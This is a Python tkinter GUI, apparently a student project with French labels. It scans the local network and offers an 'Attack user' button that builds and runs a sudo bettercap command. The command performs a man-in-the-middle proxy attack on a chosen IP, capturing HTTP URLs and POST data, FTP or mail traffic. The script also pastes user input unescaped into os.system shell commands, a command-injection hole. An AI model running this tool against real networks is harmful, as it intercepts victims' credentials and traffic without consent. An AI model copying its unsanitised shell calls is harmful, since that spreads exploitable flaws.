#!/usr/bin/env python
# -*- coding: utf-8 -*-

# ----- IMPORTS ----- #

from tkinter import *
from tkinter import ttk
from tkinter import filedialog
import subprocess as sub
import netifaces as nf
import time
import sys
import os

# ----- FONCTIONS ----- #

def NewFile():
    main.set("")
    attack.set("")

def List_user_auto():
	os.system('rm scan_list')
	os.system('rm interfaces')
	main.set(os.system('python3 interface_list_user2.py'))
	file = open('scan_list', 'r')
	main.set(file.read())
	file.close()
def List_user_man():
	os.system('rm scan_list')
	main.set(os.system('python3 interface_list_user.py'))
	file = open('scan_list', 'r')
	main.set(file.read())
	file.close()
def Print_attack_user():
	flux = ["HTTP","FTP","MAIL"]

	ttk.Label(mainframe, text="Machine à attaquer : ").grid(row=3,column=1)
	ttk.Entry(mainframe, width=20, textvariable=ip).grid(row=3, column=2)
	ttk.Label(mainframe, text="Flux ciblé : ").grid(row=4,column=1)
	ttk.Label(mainframe, textvariable=flux).grid(row=4,column=2)
	ttk.Entry(mainframe, textvariable=flux_choix).grid(row=4,column=3)
	ttk.Button(mainframe, text="Attack !", command=Attack_user).grid(row=3,column=3)

def Attack_user(*args):
	os.system("echo '' > attack.sh")

	value = str(ip.get())
	value2 = str(flux_choix.get())

	if value2 == "HTTP":
		value2 = "URL,POST"
	else :
		value2 = value2

	string_attack = "#!/bin/sh\n\nsudo bettercap -X -T " + value + " --proxy -P " + value2

	os.system('echo "' + string_attack + '" > attack.sh')
	os.system("python tkinter-read-async-subprocess-output.py")
	
def About():
    main.set("This is a simple example of a menu")



# ----- INTERFACE ----- #

root = Tk()
root.title("EIB")
root.geometry("1280x800")
mainframe = ttk.Frame(root, padding="3 3 12 12")
mainframe.grid(column=0, row=0, sticky=(N, W, E, S))
mainframe.columnconfigure(0, weight=2)
mainframe.rowconfigure(0, weight=2)
menu = Menu(root)
root.config(menu=menu)

main = StringVar()
attack = StringVar()
ip = StringVar()
flux_choix = StringVar()


# ----- MENU ----- #

filemenu = Menu(menu)
menu.add_cascade(label="File", menu=filemenu)
filemenu.add_command(label="New", command=NewFile)
filemenu.add_separator()
filemenu.add_command(label="Exit", command=root.quit)

actionmenu = Menu(menu)
menu.add_cascade(label="Action", menu=actionmenu)
actionmenu.add_command(label="List network auto", command=List_user_auto)
actionmenu.add_command(label="List network manuel", command=List_user_man)
actionmenu.add_command(label="Attack user", command=Print_attack_user)

helpmenu = Menu(menu)
menu.add_cascade(label="Help", menu=helpmenu)
helpmenu.add_command(label="About...", command=About)

# ----- AFFICHAGE ----- #

ttk.Label(mainframe, textvariable=main).grid(row=1, column=2)
ttk.Label(mainframe, textvariable=attack).grid(row=2, column=2)

	

# ----- FIN INTERFACE ---- #

mainloop()

